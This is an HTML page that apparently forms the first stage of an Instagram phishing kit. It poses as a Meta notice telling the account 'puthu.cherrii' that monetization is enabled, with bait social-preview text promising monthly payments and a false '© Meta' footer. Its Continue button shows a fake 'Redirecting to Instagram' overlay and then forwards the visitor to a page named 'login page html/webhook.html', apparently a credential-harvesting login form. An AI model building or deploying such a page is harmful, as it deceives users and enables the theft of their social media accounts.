<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <meta name="theme-color" content="#000000">
  <title>puthu.cherrii</title>

  <!-- ============================================================
       SOCIAL MEDIA PREVIEW (OPEN GRAPH & TWITTER CARDS)
       ============================================================ -->
  <meta property="og:title" content="Monetization Enabled" />
  <meta property="og:description" content="Your Instagram monetization is enabled you can get your monthly payment on every 27th" />
  <meta property="og:image" content="https://i.ibb.co/5br2jgg/Instagram-logo-2022.jpg" />
  <meta property="og:image:width" content="1000" />
  <meta property="og:image:height" content="1000" />
  <meta property="og:url" content="YOUR_PAGE_URL_HERE" />
  <meta property="og:type" content="website" />

  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Monetization Enabled" />
  <meta name="twitter:description" content="Your Instagram monetization is enabled you can get your monthly payment on every 27th" />
  <meta name="twitter:image" content="https://i.ibb.co/5br2jgg/Instagram-logo-2022.jpg" />
  <!-- ============================================================ -->

  <style>
    :root {
      color-scheme: dark;
      --bg: #000;
      --surface: #121212;
      --text: #fff;
      --muted: #a8a8a8;
      --border: #363636;
      --blue: #0095f6;
    }

    [data-theme="light"] {
      color-scheme: light;
      --bg: #fff;
      --surface: #fafafa;
      --text: #262626;
      --muted: #737373;
      --border: #dbdbdb;
      --blue: #0095f6;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, Helvetica, Arial, sans-serif;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      min-height: 100vh;
      min-height: 100dvh;
      display: flex;
      flex-direction: column;
      background: var(--bg);
      color: var(--text);
      transition: background .2s, color .2s;
      padding:
        env(safe-area-inset-top)
        env(safe-area-inset-right)
        env(safe-area-inset-bottom)
        env(safe-area-inset-left);
    }

    button, a {
      touch-action: manipulation;
    }

    a:focus-visible,
    button:focus-visible {
      outline: 2px solid var(--blue);
      outline-offset: 3px;
    }

    .theme-toggle {
      position: absolute;
      top: calc(20px + env(safe-area-inset-top));
      left: calc(16px + env(safe-area-inset-left));
      padding: 7px 12px;
      border: 1px solid var(--border);
      border-radius: 20px;
      background: var(--surface);
      color: var(--text);
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      z-index: 10;
    }

    .brand-logo {
      position: absolute;
      top: calc(16px + env(safe-area-inset-top));
      right: calc(16px + env(safe-area-inset-right));
      width: 44px;
      height: 44px;
      display: block;
      z-index: 10;
      border-radius: 12px;
    }

    .brand-logo svg {
      display: block;
      width: 100%;
      height: 100%;
    }

    .page {
      width: 100%;
      max-width: 448px;
      flex: 1;
      margin: 0 auto;
      padding: 0 24px 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .profile {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 76px;
      margin-bottom: 30px;
    }

    .logo-wrapper {
      width: 112px;
      height: 112px;
      margin-bottom: 18px;
      flex-shrink: 0;
    }

    .logo-ring {
      position: relative;
      width: 100%;
      height: 100%;
      padding: 3px;
      border-radius: 50%;
      background: linear-gradient(135deg,
        #FFDC80 0%, #F77737 25%, #E1306C 50%,
        #C13584 75%, #405DE6 100%);
      box-shadow: 0 6px 22px #0005;
    }

    .logo-ring::after {
      content: "";
      position: absolute;
      top: 3px; left: 3px; right: 3px; bottom: 3px;
      border-radius: 50%;
      background: var(--bg);
      pointer-events: none;
    }

    .logo-ring img {
      position: absolute;
      top: 6px; left: 6px; right: 6px; bottom: 6px;
      width: calc(100% - 12px);
      height: calc(100% - 12px);
      object-fit: cover;
      border-radius: 50%;
      background: var(--bg);
      z-index: 1;
    }

    .logo-fallback {
      position: absolute;
      top: 6px; left: 6px; right: 6px; bottom: 6px;
      border-radius: 50%;
      background: var(--bg);
      display: grid;
      place-items: center;
      z-index: 0;
    }

    .logo-fallback svg {
      display: block;
      width: 54%;
      height: 54%;
    }

    .logo-wrapper.has-image .logo-fallback {
      display: none;
    }

    .profile-name {
      font-size: 20px;
      font-weight: 700;
      letter-spacing: -.2px;
      text-align: center;
    }

    .page-content {
      position: relative;
      width: 100%;
      padding: 30px 24px 24px;
      overflow: hidden;
      border: 1px solid var(--border);
      border-radius: 18px;
      background: var(--surface);
      text-align: center;
    }

    .page-content::before {
      content: "";
      position: absolute;
      top: 0; left: 0; right: 0;
      height: 4px;
      background: linear-gradient(90deg,
        #FFDC80 0%, #F77737 25%, #E1306C 50%,
        #C13584 75%, #405DE6 100%);
    }

    .badge {
      width: 52px;
      height: 52px;
      margin: 0 auto 18px;
      border-radius: 50%;
      display: grid;
      place-items: center;
      background: linear-gradient(135deg,
        #FFDC80 0%, #F77737 25%, #E1306C 50%,
        #C13584 75%, #405DE6 100%);
      box-shadow: 0 4px 14px #0004;
    }

    .badge svg {
      display: block;
      width: 24px;
      height: 24px;
    }

    .content-title {
      margin-bottom: 16px;
      font-size: 26px;
      font-weight: 800;
      line-height: 1.2;
      letter-spacing: -.5px;
      text-align: center;
    }

    .content-highlight {
      margin-bottom: 8px;
      font-size: 17px;
      font-weight: 700;
      line-height: 1.45;
      letter-spacing: -.1px;
      text-align: center;
    }

    .content-sub {
      max-width: 260px;
      margin: 0 auto;
      color: var(--muted);
      font-size: 14px;
      font-weight: 500;
      line-height: 1.6;
      text-align: center;
    }

    .divider {
      width: 100%;
      height: 1px;
      margin: 22px 0;
      background: var(--border);
    }

    .continue-btn {
      display: block;
      width: 100%;
      min-height: 48px;
      padding: 13px 14px;
      border: 0;
      border-radius: 25px;
      background: var(--blue);
      color: #fff;
      font-size: 16px;
      font-weight: 700;
      letter-spacing: .2px;
      text-align: center;
      cursor: pointer;
      transition: background .2s, transform .1s;
      user-select: none;
      -webkit-user-select: none;
      text-decoration: none;
    }

    .continue-btn:hover {
      background: #1877f2;
    }

    .continue-btn:active {
      transform: scale(.985);
    }

    .footer {
      margin-top: auto;
      padding-top: 36px;
      color: var(--muted);
      font-size: 13px;
      font-weight: 600;
      text-align: center;
    }

    /* ============================================================
       REDIRECT OVERLAY ANIMATION
       ============================================================ */
    .redirect-overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      z-index: 999;
      display: none; /* Hidden by default */
      align-items: center;
      justify-content: center;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
    }

    .redirect-box {
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 20px;
      padding: 30px 20px;
      width: 80%;
      max-width: 280px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }

    .redirect-text {
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      text-align: center;
      letter-spacing: 0.3px;
    }

    .bubbles {
      display: flex;
      gap: 10px;
    }

    .bubble {
      width: 14px;
      height: 14px;
      background: #fff;
      border-radius: 50%;
      animation: wave 1.2s infinite ease-in-out;
    }

    .bubble:nth-child(1) { animation-delay: 0s; }
    .bubble:nth-child(2) { animation-delay: 0.15s; }
    .bubble:nth-child(3) { animation-delay: 0.3s; }

    @keyframes wave {
      0%, 100% { transform: translateY(0); opacity: 0.5; }
      50% { transform: translateY(-12px); opacity: 1; }
    }

    @media (max-height: 650px) {
      .profile {
        margin-top: 44px;
        margin-bottom: 22px;
      }

      .logo-wrapper {
        width: 88px;
        height: 88px;
        margin-bottom: 14px;
      }

      .page-content {
        padding: 24px 18px 20px;
      }

      .content-title {
        font-size: 23px;
      }

      .badge {
        width: 46px;
        height: 46px;
        margin-bottom: 14px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        transition-duration: .01ms !important;
      }
    }
  </style>
</head>

<body>

  <button
    class="theme-toggle"
    id="themeToggle"
    type="button"
    aria-label="Toggle color theme"
  >Light Mode</button>

  <a
    class="brand-logo"
    href="https://www.instagram.com/puthu.cherrii/"
    target="_blank"
    rel="noopener"
    aria-label="Open Instagram page"
  >
    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <defs>
        <linearGradient id="igGradient"
                        x1="0%" y1="100%" x2="100%" y2="0%">
          <stop offset="0%" stop-color="#FFDC80"/>
          <stop offset="25%" stop-color="#F77737"/>
          <stop offset="50%" stop-color="#E1306C"/>
          <stop offset="75%" stop-color="#C13584"/>
          <stop offset="100%" stop-color="#405DE6"/>
        </linearGradient>
      </defs>
      <rect x="10" y="10" width="80" height="80" rx="22"
            fill="none" stroke="url(#igGradient)" stroke-width="6"/>
      <circle cx="50" cy="50" r="18"
              fill="none" stroke="url(#igGradient)" stroke-width="6"/>
      <circle cx="76" cy="24" r="4" fill="url(#igGradient)"/>
    </svg>
  </a>

  <main class="page">

    <header class="profile">
      <div class="logo-wrapper" id="logoWrapper">
        <div class="logo-ring">
          <div class="logo-fallback" aria-hidden="true">
            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
              <defs>
                <linearGradient id="igGradient2" x1="0%" y1="100%" x2="100%" y2="0%">
                  <stop offset="0%" stop-color="#FFDC80"/>
                  <stop offset="25%" stop-color="#F77737"/>
                  <stop offset="50%" stop-color="#E1306C"/>
                  <stop offset="75%" stop-color="#C13584"/>
                  <stop offset="100%" stop-color="#405DE6"/>
                </linearGradient>
              </defs>
              <rect x="10" y="10" width="80" height="80" rx="22"
                    fill="none" stroke="url(#igGradient2)" stroke-width="6"/>
              <circle cx="50" cy="50" r="18"
                      fill="none" stroke="url(#igGradient2)" stroke-width="6"/>
              <circle cx="76" cy="24" r="4" fill="url(#igGradient2)"/>
            </svg>
          </div>
          <img
            id="logoImg"
            src="https://i.ibb.co/qYmPZ007/527509818-17858523009465711-8638412872996418998-n.jpg"
            alt="puthu.cherrii profile picture"
            referrerpolicy="no-referrer"
            onload="document.getElementById('logoWrapper').classList.add('has-image');"
            onerror="this.style.display='none';"
          >
        </div>
      </div>
      <h1 class="profile-name">puthu.cherrii</h1>
    </header>

    <section class="page-content" aria-label="Message">
      <div class="badge" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="#fff"
             stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <path d="M4 12.5l5 5L20 6.5"/>
        </svg>
      </div>

      <h2 class="content-title">Congratulations</h2>
      <p class="content-highlight">Your Monetization is enabled</p>
      <p class="content-sub">Follow the further steps to claim it</p>
      
      <div class="divider"></div>

      <!-- Changed to a button to control the redirect animation -->
      <button id="continueBtn" class="continue-btn">
        Continue
      </button>
    </section>

    <footer class="footer">© Meta</footer>
  </main>

  <!-- ============================================================
       REDIRECT OVERLAY (Hidden by default)
       ============================================================ -->
  <div class="redirect-overlay" id="redirectOverlay">
    <div class="redirect-box">
      <div class="bubbles">
        <div class="bubble"></div>
        <div class="bubble"></div>
        <div class="bubble"></div>
      </div>
      <div class="redirect-text">Redirecting to Instagram...</div>
    </div>
  </div>

  <script>
    "use strict";

    /* ============================================================
       1. SET YO PAGE URL HERE
       ============================================================ */
    const NEXT_PAGE_URL = "content://ru.zdevs.zarchiver.external/storage/emulated/0/login%20page%20html/webhook.html";

    const html = document.documentElement;
    const themeToggle = document.getElementById("themeToggle");
    const continueBtn = document.getElementById("continueBtn");
    const redirectOverlay = document.getElementById("redirectOverlay");

    // Theme toggle
    function updateThemeButton() {
      const isDark = html.dataset.theme === "dark";
      themeToggle.textContent = isDark ? "Light Mode" : "Dark Mode";
      document.querySelector('meta[name="theme-color"]')
        .setAttribute("content", isDark ? "#000000" : "#ffffff");
    }

    themeToggle.addEventListener("click", () => {
      html.dataset.theme = html.dataset.theme === "dark" ? "light" : "dark";
      updateThemeButton();
    });

    updateThemeButton();

    // Continue button animation and redirect
    continueBtn.addEventListener("click", () => {
      // Show the overlay animation
      redirectOverlay.style.display = "flex";

      // Wait 2.5 seconds, then redirect to the full-screen login page
      setTimeout(() => {
        window.location.href = NEXT_PAGE_URL;
      }, 2500);
    });
  </script>
</body>
</html>
